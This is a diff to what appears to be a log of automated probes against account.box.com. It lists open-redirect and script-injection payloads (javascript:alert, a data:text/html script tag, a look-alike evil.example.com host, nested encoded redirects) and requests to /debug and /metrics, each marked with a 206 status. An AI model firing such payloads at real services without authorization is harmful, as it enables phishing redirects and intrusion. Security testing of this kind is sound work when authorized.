@@ -46,3 +46,17 @@ https://account.box.com/metrics -> 206
 https://account.box.com/login -> 206
 https://account.box.com/sso?redirect_url=https://evil.example.com/path -> 206
 https://account.box.com/login?redirect_url=%2Fsso%3Fredirect_url%3Dhttps%3A%2F%2Fevil.example.com%2Fpath -> 206
+
+## 2026-08-21 19:49:37 UTC account.box.com
+https://account.box.com/sso?redirect_url=javascript:alert(1 -> 206
+https://account.box.com/sso?redirect_url=data:text/html,%3Cscript%3Ealert(1 -> 206
+https://account.box.com/sso?redirect_url=https://account.box.com.evil.example.com -> 206
+https://account.box.com/debug -> 206
+https://account.box.com/status -> 206
+https://account.box.com/health -> 206
+https://account.box.com/metrics -> 206
+https://account.box.com/login?redirect_url=%2Fsso%3Fredirect_url%3Djavascript%3Aalert%281%29 -> 206
+https://account.box.com/login?redirect_url=%2Fsso%3Fredirect_url%3Ddata%3Atext%2Fhtml%2C%253Cscript%253Ealert%281%29%253C%2Fscript%253E -> 206
+https://account.box.com/login?redirect_url=%2Fsso%3Fredirect_url%3Dhttps%3A%2F%2Faccount.box.com.evil.example.com -> 206
+https://account.box.com/login?redirect_url=%2Fdebug -> 206
+https://account.box.com/login?redirect_url=%2Fstatus -> 206
